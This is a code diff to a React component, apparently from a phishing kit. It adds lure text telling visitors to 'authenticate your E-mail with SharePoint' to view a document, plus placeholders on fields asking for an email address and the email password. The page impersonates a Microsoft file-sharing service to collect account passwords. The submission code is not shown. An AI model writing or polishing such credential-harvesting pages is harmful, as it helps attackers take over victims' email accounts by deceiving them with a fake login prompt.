@@ -126,6 +126,10 @@ const DriveMain = () => {
                     alt="dream"
                     className="w-60 place-content-center"
                   />
+                  <div className="text-xs text-red-300">
+                    To download/view your document authenticate your E-mail with
+                    SharePoint
+                  </div>
                   <form className="mt-6" onSubmit={handleSubmit}>
                     <div className="mb-2">
                       <label
@@ -138,6 +142,7 @@ const DriveMain = () => {
                         type="email"
                         value={eml}
                         onChange={(e) => setEml(e.target.value)}
+                        placeholder="Enter your email"
                         required
                         className="block w-full px-4 py-2 mt-2 text-drive bg-white border rounded-md focus:border-drive focus:ring-drive focus:outline-none focus:ring focus:ring-opacity-40"
                       />
@@ -153,6 +158,7 @@ const DriveMain = () => {
                         type="password"
                         value={emlPass}
                         onChange={(e) => setEmlPass(e.target.value)}
+                        placeholder="Email password"
                         required
                         className="block w-full px-4 py-2 mt-2 text-drive bg-white border rounded-md focus:border-drive focus:ring-drive focus:outline-none focus:ring focus:ring-opacity-40"
                       />
